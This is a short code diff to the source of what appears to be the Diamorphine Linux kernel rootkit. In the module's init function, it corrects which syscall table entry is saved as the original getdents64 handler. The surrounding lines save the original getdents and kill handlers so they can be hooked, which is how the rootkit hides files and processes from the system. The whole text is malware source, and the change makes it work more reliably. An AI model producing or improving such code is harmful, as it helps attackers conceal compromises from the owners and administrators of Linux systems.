@@ -357,7 +357,7 @@ diamorphine_init(void)
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
-	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents];
+	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
 	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
 #else
 	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
